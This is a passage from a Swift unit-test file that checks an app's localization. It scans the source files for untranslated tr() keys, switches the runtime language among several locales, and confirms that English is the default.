        let known = Set(try table("en").keys)
        let files = FileManager.default.enumerator(at: Self.root.appendingPathComponent("Sources"), includingPropertiesForKeys: nil)!.compactMap { $0 as? URL }.filter { $0.pathExtension == "swift" }
        let rx = try NSRegularExpression(pattern: #"\btr\("((?:[^"\\]|\\.)*)""#)
        var missing: [String] = []
        for f in files where !f.lastPathComponent.hasPrefix("Localization") {
            let s = try String(contentsOf: f)
            for m in rx.matches(in: s, range: NSRange(s.startIndex..., in: s)) {
                let raw = String(s[Range(m.range(at: 1), in: s)!])
                let key = raw.replacingOccurrences(of: #"\(...)"#, with: "")           // las interpolaciones no llegan a las claves
                if raw.contains("\\(") { continue }
                if !known.contains(key) && !key.replacingOccurrences(of: "\\n", with: "\n").isEmpty && !known.contains(key.replacingOccurrences(of: "\\n", with: "\n")) { missing.append("\(f.lastPathComponent): \(key)") }
            }
        }
        XCTAssertTrue(missing.isEmpty, "sin traducir:\n" + missing.joined(separator: "\n"))
    }

    func testRuntimeLanguageSwitch() {
        let bundle = Bundle(path: Self.resources.path)!
        XCTAssertEqual(Loc.set("en", resourceBundle: bundle), "en"); XCTAssertEqual(tr("Cancelar"), "Cancel")
        Loc.set("fr", resourceBundle: bundle); XCTAssertEqual(tr("Cancelar"), "Annuler")
        Loc.set("de", resourceBundle: bundle); XCTAssertEqual(tr("Guardar"), "Sichern")
        Loc.set("es", resourceBundle: bundle); XCTAssertEqual(tr("Cancelar"), "Cancelar")
        XCTAssertEqual(Loc.set("xx", resourceBundle: bundle), "en", "idioma desconocido → inglés")
        Loc.set("it", resourceBundle: bundle)
        XCTAssertEqual(tr("No se abre la sesión: %@", "ssh"), "Impossibile aprire la sessione: ssh")
        XCTAssertEqual(tr("Texto que no existe %@", "x"), "Texto que no existe x", "sin traducción se muestra la clave")
        Loc.set("en", resourceBundle: bundle)
    }

    func testDefaultLanguageIsEnglish() { XCTAssertEqual(Loc.defaultCode, "en"); XCTAssertEqual(AppSettingsData().language, "en") }
}
